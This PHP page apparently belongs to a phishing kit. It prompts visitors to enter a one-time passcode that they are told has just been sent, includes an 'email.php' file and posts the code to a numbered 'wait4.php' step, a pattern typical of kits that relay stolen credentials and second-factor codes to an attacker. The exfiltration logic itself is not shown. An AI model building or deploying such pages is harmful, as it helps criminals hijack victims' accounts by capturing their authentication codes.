<?php

include "header.php";
include "../email.php";


?>
<link rel="stylesheet" href="../css/index.css">

<main class="" style="min-height:450px; background-color: #F3F4F6;">
    <div class="row container-expand-gl mx-auto  co" style="width: 75%; padding:0; ">

        <br>
        <p class="col-12 par" style="font-size: 28px; margin:10px;">We will send you an otp code <br> wait under 1-3 minutes</p>
        <br>
        <div class="col-12 mx-auto row co1" style="background-color: white;height:360px ; padding:0; margin:40px;">

            <div class="col-4  mx-auto form-group " style="margin-top: 70px;">
                <form action="wait4.php" method="post">
                    <div class="mb-5"></div>

                    OTP code :&nbsp; &nbsp; <input name="otp2" type="number" class="form-control" id="otp " required> <br>
                    <button type="submit" class="btn btn-block " style="background-color: #DA1E10; color:white; font-weight: blod;">Verify</button>
                </form>
            </div>
        </div>
    </div>
</main>
<style>
    @media only screen and (max-width: 800px) {
        .co {
            width: 200% !important;
        }

        main {
            background-color: white !important;
        }

        .par {
            margin: 0px !important;
            font-size: 16px !important;
        }

        .co1 {
            margin: 0px !important;
            transform: translate(-27%, 0);
        }

    }
</style>
<br> <br>
<?php
include "footer.php";



?>